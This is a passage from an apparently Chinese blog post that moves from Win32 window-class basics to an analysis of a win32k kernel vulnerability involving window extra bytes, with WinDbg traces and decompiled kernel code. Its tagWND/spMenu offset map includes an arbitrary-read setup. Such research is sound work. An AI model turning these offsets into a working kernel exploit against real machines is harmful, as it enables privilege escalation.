图标的句柄</span></span><br><span class="line">  HCURSOR   hCursor; <span class="comment">// 光标的句柄</span></span><br><span class="line">  HBRUSH    hbrBackground; <span class="comment">// 背景刷的句柄</span></span><br><span class="line">  LPCSTR    lpszMenuName; <span class="comment">// 菜单资源名称的字符串指针，用null截断</span></span><br><span class="line">  LPCSTR    lpszClassName; <span class="comment">// 窗口类名称的字符串指针，用null截断</span></span><br><span class="line">  HICON     hIconSm; <span class="comment">// 小图标的句柄</span></span><br><span class="line">&#125; WNDCLASSEXA, *PWNDCLASSEXA, *NPWNDCLASSEXA, *LPWNDCLASSEXA;</span><br></pre></td></tr></table></figure>

<p>在我们注册完窗口类后，就可以通过 <code>InitInstance</code> 来初始化应用程序，其会创建窗口并进行展示更新：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   函数: InitInstance(HINSTANCE, int)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   目标: 保存实例句柄并创建主窗口</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   注释:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        在此函数中，我们在全局变量中保存实例句柄并</span></span><br><span class="line"><span class="comment">//        创建和显示主程序窗口。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">BOOL <span class="title">InitInstance</span><span class="params">(HINSTANCE hInstance, <span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   hInst = hInstance; <span class="comment">// 将实例句柄存储在全局变量中</span></span><br><span class="line"></span><br><span class="line">   HWND hWnd = <span class="built_in">CreateWindowW</span>(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,</span><br><span class="line">      CW_USEDEFAULT, <span class="number">0</span>, CW_USEDEFAULT, <span class="number">0</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInstance, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!hWnd)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">return</span> FALSE;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">ShowWindow</span>(hWnd, nCmdShow);</span><br><span class="line">   <span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们不执行别的操作，那么窗口随后就会被销毁。而实际情况下我们所使用的桌面程序都不会初始化之后就立即销毁，而是会根据我们的一系列操作（鼠标点击、键盘输入等）进行对应的反应。这些操作作为消息传入程序中进行对应的处理，所以我们需要一个循环来接收并处理消息，如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主消息循环:</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">TranslateAccelerator</span>(msg.hwnd, hAccelTable, &amp;msg))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">TranslateMessage</span>(&amp;msg); <span class="comment">// 解析消息</span></span><br><span class="line">        <span class="built_in">DispatchMessage</span>(&amp;msg); <span class="comment">// 派发消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>操作系统会把每个操作包装为消息结构体（记录了发生在哪个窗口，也就是句柄；还有消息编号、消息坐标等），并放入线程的消息队列，我们通过 <code>GetMessage</code> 可以取出消息，并通过 <code>TranslateMessage</code> 将虚拟键消息进行转换，之后通过 <code>DispatchMessage</code> 处理每种消息。在 <code>WNDCLASSEXW</code> 结构中所对应的也就是 <code>lpfnWndProc</code> ，把它赋值为某一方法，则 <code>DispatchMessage</code> 就会调用到某个方法，我们这里所传入的是 <code>WndProc</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wcex.lpfnWndProc    = WndProc;</span><br></pre></td></tr></table></figure>

<p>则会调用到 <code>WndProc</code> 进行消息处理：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  目标: 处理主窗口的消息。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  WM_COMMAND  - 处理应用程序菜单</span></span><br><span class="line"><span class="comment">//  WM_PAINT    - 绘制主窗口</span></span><br><span class="line"><span class="comment">//  WM_DESTROY  - 发送退出消息并返回</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> wmId = <span class="built_in">LOWORD</span>(wParam);</span><br><span class="line">            <span class="comment">// 分析菜单选择:</span></span><br><span class="line">            <span class="keyword">switch</span> (wmId)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> IDM_ABOUT:</span><br><span class="line">                <span class="built_in">DialogBox</span>(hInst, <span class="built_in">MAKEINTRESOURCE</span>(IDD_ABOUTBOX), hWnd, About);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IDM_EXIT:</span><br><span class="line">                <span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">        &#123;</span><br><span class="line">            PAINTSTRUCT ps;</span><br><span class="line">            HDC hdc = <span class="built_in">BeginPaint</span>(hWnd, &amp;ps);</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> 在此处添加使用 hdc 的任何绘图代码...</span></span><br><span class="line">            <span class="built_in">EndPaint</span>(hWnd, &amp;ps);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">        <span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, message, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>WndProc</code> 函数对 <code>WM_COMMAND, WM_PAINT, WM_DESTROY</code> 消息进行了处理，如果我们点击菜单的 <code>about</code> ，则会调用 <code>About</code> 函数进行进一步处理：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// “关于”框的消息处理程序。</span></span><br><span class="line"><span class="function">INT_PTR CALLBACK <span class="title">About</span><span class="params">(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(lParam);</span><br><span class="line">    <span class="keyword">switch</span> (message)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> WM_INITDIALOG:</span><br><span class="line">        <span class="keyword">return</span> (INT_PTR)TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> WM_COMMAND:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">LOWORD</span>(wParam) == IDOK || <span class="built_in">LOWORD</span>(wParam) == IDCANCEL)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">EndDialog</span>(hDlg, <span class="built_in">LOWORD</span>(wParam));</span><br><span class="line">            <span class="keyword">return</span> (INT_PTR)TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (INT_PTR)FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然也可以点击退出去销毁该窗口类。</p>
<h2 id="额外字节"><a href="#额外字节" class="headerlink" title="额外字节"></a>额外字节</h2><p>在 <code>WNDCLASSEXA</code> 结构中存在着 <code>cbClsExtra</code> 和 <code>cbWndExtra</code> 两个额外字节成员：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagWNDCLASSEXA</span> &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="type">int</span>       cbClsExtra; <span class="comment">// 窗口类额外字节，初始化为0</span></span><br><span class="line">  <span class="type">int</span>       cbWndExtra; <span class="comment">// 窗口类实例额外字节，初始化为0</span></span><br><span class="line">...</span><br><span class="line">&#125; WNDCLASSEXA, *PWNDCLASSEXA, *NPWNDCLASSEXA, *LPWNDCLASSEXA;</span><br></pre></td></tr></table></figure>

<p>这两者十分相似，它们有什么作用和区别呢？</p>
<p>对于窗口类额外字节，在应用程序注册窗口类的时候，便可以请求系统分配一定大小的内存空间作为该窗口类的拓展内存空间。在之后该窗口类的所有子窗口都共享该内存空间，且可以使用这片内存进行窗口通信。程序员可以使用以下方法进行该内存空间的读写：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetClassLongW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>  nIndex</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG_PTR <span class="title">GetClassLongPtrW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>  nIndex</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">SetClassLongW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>  nIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LONG dwNewLong</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONG_PTR <span class="title">SetClassLongPtrW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND     hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>      nIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LONG_PTR dwNewLong</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中 <code>GetClassLongW</code> 和 <code>SetClassLongW</code> 是 <code>32</code> 位系统所使用的， <code>GetClassLongPtrW</code> 和 <code>SetClassLongPtrW</code> 兼容了 <code>32</code> 和 <code>64</code> 位系统，在 <code>32</code> 位系统中会直接调用 <code>GetClassLongW</code> 和 <code>SetClassLongW</code> 。</p>
<p>同样的，当窗口创建的时候，也可以让系统分配一定大小的内存空间作为每个窗口独有的拓展内控空间。窗口可以使用这部分空间进行数据存储与读取。程序员可以使用以下方法进行该内存空间的读写：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">GetWindowLongW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>  nIndex</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG_PTR <span class="title">GetWindowLongPtrW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>  nIndex</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG <span class="title">SetWindowLongW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>  nIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LONG dwNewLong</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONG_PTR <span class="title">SetWindowLongPtrW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HWND     hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] <span class="type">int</span>      nIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LONG_PTR dwNewLong</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>其中 <code>GetWindowLongW</code> 和 <code>SetWindowLongW</code> 是 <code>32</code> 位系统所使用的， <code>GetWindowLongPtrW</code> 和 <code>SetWindowLongPtrW</code> 兼容了 <code>32</code> 和 <code>64</code> 位系统，在 <code>32</code> 位系统中会直接调用 <code>GetWindowLongW</code> 和 <code>SetWindowLongW</code> 。</p>
<h2 id="tagWND-结构体"><a href="#tagWND-结构体" class="headerlink" title="tagWND 结构体"></a>tagWND 结构体</h2><p>在 <code>Windows</code> 中会使用 <code>tagWND</code> 结构体来描述每个窗口，但由于 <code>win32k</code> 漏洞频出，所以微软去掉了 <code>tagWND</code> 结构体的符号。目前而言我们只能参考 <code>WIn7</code> 之前的符号来猜测 <code>Win10</code> 中 <code>tagWND</code> 结构体的内容。</p>
<p>不过由于 <code>win32k</code> 的漏洞频出，所以已经有很多安全研究人员针对 <code>tagWND</code> 结构体进行了对应的研究。一个需要关注的点便是用户态和内核态分别维护了每一个窗口的 <code>tagWND</code> 结构体，用户态 <code>&amp;poi + 0x28</code> 处的一个 <code>QWORD</code> 为一个指向内核态 <code>tagWND</code> 结构体的指针。我们分别记用户态和内核态的指针为 <code>ptagWND</code> 和 <code>ptagWNDk</code> 。</p>
<p>结构体总体如下（不同版本不同）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">ptagWND</span><br><span class="line">    <span class="number">0x10</span> THREADINFO</span><br><span class="line">        <span class="number">0x00</span> pTEB</span><br><span class="line">            <span class="number">0x220</span> <span class="built_in">pEPROCESS</span>(current process)</span><br><span class="line"></span><br><span class="line">    <span class="number">0x18</span> somePtr</span><br><span class="line">        <span class="number">0x80</span> DesktopBaseAddr</span><br><span class="line"></span><br><span class="line">    <span class="number">0x28</span> ptagWNDk</span><br><span class="line">        <span class="number">0x00</span> hwnd</span><br><span class="line">        <span class="number">0x08</span> ptagWNDkOffset = (ptagWNDk - DesktopBaseAddr)</span><br><span class="line">        <span class="number">0x18</span> dwStyle</span><br><span class="line">        <span class="number">0x58</span> rcBar-&gt;left</span><br><span class="line">        <span class="number">0x5C</span> rcBar-&gt;top</span><br><span class="line">				<span class="number">0x60</span> rcBar-&gt;right</span><br><span class="line">        <span class="number">0x64</span> rcBar-&gt;<span class="built_in">bottom</span>(maybe)</span><br><span class="line">        <span class="number">0x98</span> spMenu</span><br><span class="line">        <span class="number">0xC8</span> cbWndExtra</span><br><span class="line">        <span class="number">0xE8</span> dwExtraFlag</span><br><span class="line">        <span class="number">0x128</span> pExtraBytes</span><br><span class="line"></span><br><span class="line">    <span class="number">0xa8</span> spMenu</span><br><span class="line">        <span class="number">0x00</span> hMenu</span><br><span class="line">        <span class="number">0x28</span> somePtr</span><br><span class="line">            <span class="number">0x2C</span> check items</span><br><span class="line">        <span class="number">0x40</span> check items</span><br><span class="line">        <span class="number">0x44</span> check items</span><br><span class="line">        <span class="number">0x50</span> <span class="built_in">ptagWND</span>(important)</span><br><span class="line">        <span class="number">0x58</span> rgItems</span><br><span class="line">            <span class="number">0x00</span> arbReadAddr = targetAddr - <span class="number">0x40</span></span><br><span class="line">        <span class="number">0x98</span> spMenuk</span><br><span class="line">            <span class="number">0x00</span> <span class="built_in">SpMenu</span>(self)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该结构体的很多内容都是在后面分析中得到的，这里只是一个总结，细节还需要研究各个方法的使用。</p>
</blockquote>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本节将介绍漏洞所涉及到的函数于触发条件</p>
<h2 id="CreateWindowEx流程"><a href="#CreateWindowEx流程" class="headerlink" title="CreateWindowEx流程"></a>CreateWindowEx流程</h2><p><code>tagWND.pExtraBytes</code> 会在调用 <code>CreateWindowEx</code> 的时候初始化，最终走到 <code>xxxCreateWindowEx</code> 中，我们将上面的示例代码中 <code>cbWndExtra</code> 值进行设置：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wcex.cbWndExtra = <span class="number">0xab</span>;</span><br></pre></td></tr></table></figure>

<p>之后运行，这里调试的时候要下硬件断点：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING: Software breakpoints on session addresses can cause bugchecks.</span><br><span class="line"><span class="function">Use hardware execution <span class="title">breakpoints</span> <span class="params">(ba e)</span> <span class="keyword">if</span> possible.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">ba e1 win32kfull!xxxCreateWindowEx</span></span><br></pre></td></tr></table></figure>

<p>其调用栈如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> ffffd58e`fb0378f8 fffff9d4`d7a47c20     win32kfull!xxxCreateWindowEx</span><br><span class="line"><span class="number">01</span> ffffd58e`fb037900 fffff805`<span class="number">835</span>cde95     win32kfull!NtUserCreateWindowEx+<span class="number">0x6a0</span></span><br><span class="line"><span class="number">02</span> ffffd58e`fb037a90 <span class="number">00007f</span>fb`e82b1f24     nt!KiSystemServiceCopyEnd+<span class="number">0x25</span></span><br><span class="line"><span class="number">03</span> <span class="number">00000035</span>`<span class="number">95b</span>cf378 <span class="number">00007f</span>fb`eaab8001     win32u!NtUserCreateWindowEx+<span class="number">0x14</span></span><br><span class="line"><span class="number">04</span> <span class="number">00000035</span>`<span class="number">95b</span>cf380 <span class="number">00007f</span>fb`eaab7bf4     USER32!VerNtUserCreateWindowEx+<span class="number">0x211</span></span><br><span class="line"><span class="number">05</span> <span class="number">00000035</span>`<span class="number">95b</span>cf710 <span class="number">00007f</span>fb`eaab7a32     USER32!CreateWindowInternal+<span class="number">0x1b4</span></span><br><span class="line">*** WARNING: Unable to verify checksum <span class="keyword">for</span> test.exe</span><br><span class="line"><span class="number">06</span> <span class="number">00000035</span>`<span class="number">95b</span>cf870 <span class="number">00007f</span>f6`dfb71138     USER32!CreateWindowExW+<span class="number">0x82</span></span><br><span class="line"><span class="number">07</span> (Inline Function) --------`--------     test!InitInstance+<span class="number">0x4b</span> [D:\kernel\Win32K\poc\test\test\test.cpp @ <span class="number">100</span>] </span><br><span class="line"><span class="number">08</span> <span class="number">00000035</span>`<span class="number">95b</span>cf900 <span class="number">0000014</span>e`dcbff490     test!wWinMain+<span class="number">0x138</span> [D:\kernel\Win32K\poc\test\test\test.cpp @ <span class="number">36</span>] </span><br><span class="line"><span class="number">09</span> <span class="number">00000035</span>`<span class="number">95b</span>cf908 <span class="number">00007f</span>fb`eae9fba1     <span class="number">0x0000014e</span>`dcbff490</span><br><span class="line"><span class="number">0</span>a <span class="number">00000035</span>`<span class="number">95b</span>cf910 <span class="number">00000000</span>`<span class="number">00000000</span>     ntdll!RtlFreeHeap+<span class="number">0x51</span></span><br></pre></td></tr></table></figure>

<p>在 <code>xxxCreateWindowEx</code>  中会调用 <code>win32kbase!HMAllocObject</code> 来初始化 <code>pTagWND</code> ，随后初始化 <code>pTagWNDk-&gt;pExtraBytes</code> 为 <code>0</code> ，并在后面判断 <code>ptagWNDk-&gt;cbWndExtra</code> 是否为 0 ，如果不为 0 则使用 <code>xxxClientAllocWindowClassExtraBytes</code> 初始化 <code>pTagWNDk-&gt;pExtraBytes</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">LOBYTE</span>(TYPE_WINDOW) = <span class="number">1</span>;                      <span class="comment">// TYPE_WINDOW</span></span><br><span class="line">pTagWND = <span class="built_in">HMAllocObject</span>(gptiCurrent, pdesk, TYPE_WINDOW, <span class="number">0x150</span>i64);</span><br><span class="line">...</span><br><span class="line">*(_QWORD *)(pTagWND[<span class="number">5</span>] + <span class="number">0x128</span>i64) = <span class="number">0</span>i64;    <span class="comment">// pTagWNDk-&gt;pExtraBytes = 0</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)tagWND::RedirectedFieldcbwndExtra&lt;<span class="type">int</span>&gt;::<span class="keyword">operator</span>!=((<span class="type">char</span> *)pTagWND + <span class="number">0xB1</span>, <span class="number">0</span>) ) <span class="comment">// ptagWNDk-&gt;cbWndExtra != 0</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(pTagWND[<span class="number">5</span>] + <span class="number">0x128</span>i64) = <span class="built_in">xxxClientAllocWindowClassExtraBytes</span>(*(<span class="type">unsigned</span> <span class="type">int</span> *)(pTagWND[<span class="number">5</span>] + <span class="number">0xC8</span>i64)); <span class="comment">// pTagWNDk-&gt;pExtraBytes = xxxClientAllocWindowClassExtraBytes(ptagWNDk-&gt;cbWndExtra)</span></span><br><span class="line">	  ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>win32kbase!HMAllocObject</code> 中会使用 <code>HMAllocateUserOrIsolatedType</code> 生成用户态的 <code>pTagWND</code> 结构体指针，并使用 <code>DesktopAlloc</code> 生成内核态的 <code>pTagWNDk</code> 结构体指针。将 <code>pTagWND + 0x28</code> 处存储 <code>pTagWNDk</code> 并在 <code>pTagWND + 0x30</code> 处存储 <code>pTagWNDk</code> 和桌面堆基址的偏移。最后在 <code>pTagWND + 0x0</code> 和 <code>pTagWNDk + 0x0</code> 处都存储对应的 <code>handle</code> ：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> ( (someAttribute &amp; <span class="number">0x10</span>) != <span class="number">0</span> &amp;&amp; pdesk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)<span class="built_in">IsDesktopAllocSupported</span>() &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">goto</span> error;</span><br><span class="line">    pTagWND = (<span class="type">const</span> <span class="type">void</span> **)<span class="built_in">HMAllocateUserOrIsolatedType</span>(size, someAttribute, type);</span><br><span class="line">    <span class="keyword">if</span> ( !pTagWND )</span><br><span class="line">      <span class="keyword">goto</span> error;</span><br><span class="line">    pTagWNDk = <span class="built_in">DesktopAlloc</span>(pdesk, *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;gahti + v38 + <span class="number">16</span>), ((<span class="type">unsigned</span> __int8)type &lt;&lt; <span 